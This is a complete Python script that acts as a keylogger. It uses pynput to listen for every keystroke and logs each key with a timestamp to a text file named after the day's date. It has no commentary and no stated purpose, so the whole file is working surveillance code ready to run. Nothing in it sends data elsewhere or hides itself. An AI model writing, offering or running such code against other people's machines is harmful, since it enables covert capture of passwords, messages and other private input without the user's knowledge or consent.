from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

now = datetime.today().strftime('%Y-%m-%d')
logg = now + ".txt" 
logging.basicConfig(filename=(logg), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
